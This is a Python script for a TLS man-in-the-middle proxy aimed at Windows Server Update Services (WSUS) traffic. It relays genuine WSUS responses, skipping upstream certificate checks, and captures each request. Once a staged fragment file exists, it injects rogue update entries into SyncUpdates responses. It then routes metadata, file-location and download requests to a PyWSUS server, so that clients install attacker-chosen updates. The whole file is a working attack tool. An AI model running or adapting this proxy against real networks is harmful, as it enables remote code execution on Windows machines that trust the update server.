#!/usr/bin/env python3
"""TLS WSUS proxy that keeps genuine envelopes and injects PyWSUS updates."""
import argparse
import http.client
import http.server
import ssl
import sys
from pathlib import Path

p = argparse.ArgumentParser()
p.add_argument("--listen", default="0.0.0.0")
p.add_argument("--port", type=int, default=8531)
p.add_argument("--upstream", required=True)
p.add_argument("--upstream-port", type=int, default=8531)
p.add_argument(
    "--host-header",
    help="Host header sent upstream; defaults to UPSTREAM:UPSTREAM_PORT")
p.add_argument("--rogue-host", default="127.0.0.1")
p.add_argument("--rogue-port", type=int, required=True)
p.add_argument("--cert", type=Path, required=True)
p.add_argument("--key", type=Path, required=True)
p.add_argument("--fragment", type=Path, required=True)
p.add_argument("--capture", type=Path, required=True)
a = p.parse_args()
a.capture.mkdir(parents=True, exist_ok=True)
upstream_authority = (
    a.host_header if a.host_header else f"{a.upstream}:{a.upstream_port}")
counter = 0


class Proxy(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def relay(self):
        global counter
        counter += 1
        request_number = counter
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length)
        (a.capture / f"{request_number:03d}-request.bin").write_bytes(body)
        (a.capture / f"{request_number:03d}-request-headers.txt").write_text(
            str(self.headers), encoding="utf-8")
        action = self.headers.get("SOAPAction", "")
        # With no fragment this is a transparent, genuine retirement scan.
        # Once staged, only the injected update's metadata/content/reporting
        # is sent to PyWSUS; SyncUpdates keeps the genuine WSUS envelope.
        active = a.fragment.exists()
        use_rogue = active and (
            self.command == "GET" or any(
                name in action for name in (
                    "GetExtendedUpdateInfo",
                    "GetFileLocations",
                    "ReportEventBatch",
                )))
        if use_rogue:
            conn = http.client.HTTPConnection(
                a.rogue_host, a.rogue_port, timeout=90)
        else:
            conn = http.client.HTTPSConnection(
                a.upstream, a.upstream_port,
                context=ssl._create_unverified_context(), timeout=90)
        headers = {
            key: value for key, value in self.headers.items()
            if key.lower() not in {
                "host", "connection", "content-length", "accept-encoding"
            }
        }
        headers["Host"] = upstream_authority
        headers["Content-Length"] = str(len(body))
        try:
            conn.request(self.command, self.path, body=body, headers=headers)
            response = conn.getresponse()
            data = response.read()
            injected = False
            if ("SyncUpdates" in action and b"<SystemSpec" not in body and
                    b"<SyncUpdatesResponse" in data and a.fragment.exists()):
                if data.count(b"<Truncated>") != 1:
                    raise RuntimeError(
                        "genuine response lacks one Truncated element")
                fragment = a.fragment.read_bytes()
                if not (b"<NewUpdates>" in fragment and
                        b"</NewUpdates>" in fragment):
                    raise RuntimeError("fragment is not a NewUpdates element")
                data = data.replace(
                    b"<Truncated>", fragment + b"<Truncated>", 1)
                injected = True
            (a.capture / f"{request_number:03d}-response.bin").write_bytes(data)
            (a.capture / f"{request_number:03d}-response-meta.txt").write_text(
                f"status={response.status}\nreason={response.reason}\n"
                f"upstream={'rogue' if use_rogue else 'genuine'}\n"
                f"injected={injected}\n" +
                "".join(
                    f"{key}: {value}\n"
                    for key, value in response.getheaders()),
                encoding="utf-8")
            self.send_response(response.status, response.reason)
            for key, value in response.getheaders():
                if key.lower() not in {
                        "connection", "transfer-encoding", "content-length",
                        "content-encoding"}:
                    self.send_header(key, value)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(data)
            print(
                f"request={request_number} action={action} "
                f"upstream={'rogue' if use_rogue else 'genuine'} "
                f"injected={injected}",
                flush=True)
        except Exception as exc:
            (a.capture / f"{request_number:03d}-error.txt").write_text(
                repr(exc), encoding="utf-8")
            self.send_error(502, repr(exc))
        finally:
            conn.close()
            self.close_connection = True

    do_GET = relay
    do_POST = relay

    def log_message(self, fmt, *args):
        sys.stderr.write((fmt % args) + "\n")


server = http.server.ThreadingHTTPServer((a.listen, a.port), Proxy)
tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
tls.load_cert_chain(a.cert, a.key)
server.socket = tls.wrap_socket(server.socket, server_side=True)
server.serve_forever()
